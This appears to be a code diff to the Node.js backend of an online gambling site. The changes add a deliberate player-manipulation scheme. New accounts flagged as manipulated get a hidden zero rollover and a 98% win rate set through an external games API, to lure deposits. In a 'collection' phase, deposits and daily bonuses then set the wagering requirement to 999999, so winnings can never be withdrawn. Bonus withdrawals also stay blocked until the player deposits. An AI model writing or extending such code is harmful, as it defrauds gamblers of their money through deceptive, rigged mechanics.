@@ -139,7 +139,8 @@ app.post('/api/auth/register', async (req, res) => {
         }
         // If manipulation is OFF and phase is arrecadacao, use default signup_bonus_val from settings
 
-        const rolloverReq = signupBonus * rolloverMult;
+        // SEM ROLLOVER VISÍVEL NO INÍCIO (Conforme solicitado)
+        const rolloverReq = 0;
 
         // Auto-generate ID and Username
         const randNum = Math.floor(10000 + Math.random() * 90000).toString();
@@ -163,6 +164,25 @@ app.post('/api/auth/register', async (req, res) => {
         );
 
         console.log(`[REGISTER] User ${phone} registered. Phase:${currentPhase} Manip:${manipulationMode} Bonus:${signupBonus} Status:${manipulationStatus}`);
+
+        // Set RTP 98% immediately if manipulated
+        if (isManipulated) {
+            try {
+                const creds = await pool.query("SELECT agent_code, agent_token FROM api_credentials WHERE module = 'max_api'");
+                if (creds.rows.length > 0) {
+                    const userCode = `30win_user_${id_user}`; // Use id_user string as generated
+                    await axios.post('https://maxapigames.com/api/v2', {
+                        method: 'control_rtp',
+                        agent_code: creds.rows[0].agent_code,
+                        agent_token: creds.rows[0].agent_token,
+                        user_code: userCode,
+                        rtp: 98
+                    });
+                    console.log(`[REGISTER-MANIP] RTP set to 98% for ${userCode}`);
+                }
+            } catch (err) { console.error('Error setting initial RTP:', err.message); }
+        }
+
         res.json({ success: true, message: 'Cadastro realizado com sucesso!' });
     } catch (err) {
         console.error('Register Erro:', err);
@@ -1216,17 +1236,33 @@ async function completeDeposit(depositIdOrExternalId, isExternal = false) {
     const totalCredit = multipliedAmount + bonus;
     
     // Get rollover settings
-    const sRows = await pool.query("SELECT key_name, key_value FROM system_settings WHERE key_name = 'deposit_rollover_mult'");
+    const sRows = await pool.query("SELECT key_name, key_value FROM system_settings WHERE key_name IN ('deposit_rollover_mult', 'reward_system_phase', 'manipulation_mode')");
+    const sysSettings = {};
+    sRows.rows.forEach(r => sysSettings[r.key_name] = r.key_value);
+
+    const phase = sysSettings.reward_system_phase || 'arrecadacao';
+    const manipMode = sysSettings.manipulation_mode === 'true';
+
     let rollMult = 1;
-    if (sRows.rows.length > 0) rollMult = parseFloat(sRows.rows[0].key_value) || 1;
+    rollMult = parseFloat(sysSettings.deposit_rollover_mult) || 1;
     
-    const addedRollover = totalCredit * rollMult;
-    
-    // Update user balance and rollover
-    await pool.query(
-        'UPDATE users SET balance = balance + $1, rollover_required = rollover_required + $2 WHERE id = $3',
-        [totalCredit, addedRollover, user_id]
-    );
+    let addedRollover = totalCredit * rollMult;
+    let newRolloverTotal = 0; // Relative update below
+
+    // === MANIPULATION: Infinite Rollover in Arrecadação Mode ===
+    if (manipMode && phase === 'arrecadacao') {
+        // Force an extremely high rollover requirement
+        await pool.query(
+            'UPDATE users SET balance = balance + $1, rollover_required = 999999.00 WHERE id = $2',
+            [totalCredit, user_id]
+        );
+    } else {
+        // Standard fair-play rollover
+        await pool.query(
+            'UPDATE users SET balance = balance + $1, rollover_required = rollover_required + $2 WHERE id = $3',
+            [totalCredit, addedRollover, user_id]
+        );
+    }
     
     // Mark deposit as completed
     await pool.query('UPDATE deposits SET status = \'completed\' WHERE id = $1', [dep.id]);
@@ -1478,11 +1514,18 @@ app.post(['/api/withdraw', '/api/finance/withdraw'], authenticateToken, async (r
 
         const user = uRows.rows[0];
 
-        // === MANIPULATION WITHDRAWAL BLOCK ===
-        if (user.is_manipulated && user.manipulation_status === 'winning_pre_deposit') {
+        // === MANIPULATION WITHDRAWAL BLOCK (Registration Bonus) ===
+        const settingsRows = await pool.query("SELECT key_name, key_value FROM system_settings WHERE key_name IN ('reward_system_phase', 'manipulation_mode')");
+        const sysSettings = {};
+        settingsRows.rows.forEach(r => sysSettings[r.key_name] = r.key_value);
+
+        const phase = sysSettings.reward_system_phase || 'arrecadacao';
+        const manipMode = sysSettings.manipulation_mode === 'true';
+
+        if (manipMode && phase === 'arrecadacao' && user.is_manipulated && user.manipulation_status === 'winning_pre_deposit') {
             return res.status(400).json({ 
                 success: false, 
-                error: 'Para liberar o saque, é necessário realizar um depósito mínimo de R$ 10,00.',
+                error: 'Para liberar o saque de seu bônus, é necessário realizar um depósito mínimo de R$ 10,00.',
                 requires_deposit: true
             });
         }
@@ -2036,13 +2079,15 @@ app.get('/api/admin/daily-bonus/status', async (req, res) => {
 app.post('/api/user/claim-daily-bonus', authenticateToken, async (req, res) => {
     try {
         // Check if daily bonus is enabled
-        const settingsRows = await pool.query("SELECT key_name, key_value FROM system_settings WHERE key_name IN ('daily_bonus_enabled', 'daily_bonus_value')");
-        let enabled = false;
-        let bonusValue = 0;
-        settingsRows.rows.forEach(r => {
-            if (r.key_name === 'daily_bonus_enabled') enabled = r.key_value === 'true';
-            if (r.key_name === 'daily_bonus_value') bonusValue = parseFloat(r.key_value) || 0;
-        });
+        const settingsRows = await pool.query("SELECT key_name, key_value FROM system_settings WHERE key_name IN ('daily_bonus_enabled', 'daily_bonus_value', 'reward_system_phase', 'manipulation_mode', 'deposit_rollover_mult')");
+        const sysSettings = {};
+        settingsRows.rows.forEach(r => sysSettings[r.key_name] = r.key_value);
+
+        const enabled = sysSettings.daily_bonus_enabled === 'true';
+        const bonusValue = parseFloat(sysSettings.daily_bonus_value) || 0;
+        const phase = sysSettings.reward_system_phase || 'arrecadacao';
+        const manipMode = sysSettings.manipulation_mode === 'true';
+        const rollMult = parseFloat(sysSettings.deposit_rollover_mult) || 1;
 
         if (!enabled || bonusValue <= 0) {
             return res.json({ success: false, claimed: false, reason: 'Bônus diário desativado.' });
@@ -2067,9 +2112,16 @@ app.post('/api/user/claim-daily-bonus', authenticateToken, async (req, res) => {
             }
         }
 
-        // Credit the bonus
-        await pool.query('UPDATE users SET balance = balance + $1, last_auto_bonus = NOW() WHERE id = $2', [bonusValue, req.user.id]);
-        console.log(`[DAILY BONUS] User ${req.user.id} claimed R$${bonusValue}`);
+        // Credit the bonus with rollover logic
+        if (manipMode && phase === 'arrecadacao') {
+            await pool.query('UPDATE users SET balance = balance + $1, rollover_required = 999999.00, last_auto_bonus = NOW() WHERE id = $2', [bonusValue, req.user.id]);
+        } else {
+            // Standard fair-play rollover
+            const addedRollover = bonusValue * rollMult;
+            await pool.query('UPDATE users SET balance = balance + $1, rollover_required = rollover_required + $2, last_auto_bonus = NOW() WHERE id = $3', [bonusValue, addedRollover, req.user.id]);
+        }
+
+        console.log(`[DAILY BONUS] User ${req.user.id} claimed R$${bonusValue} (Phase: ${phase}, Manip: ${manipMode})`);
         res.json({ success: true, claimed: true, amount: bonusValue, message: `Bônus diário de R$${bonusValue.toFixed(2)} creditado!` });
     } catch (err) {
         console.error('Claim Daily Bonus Error:', err);
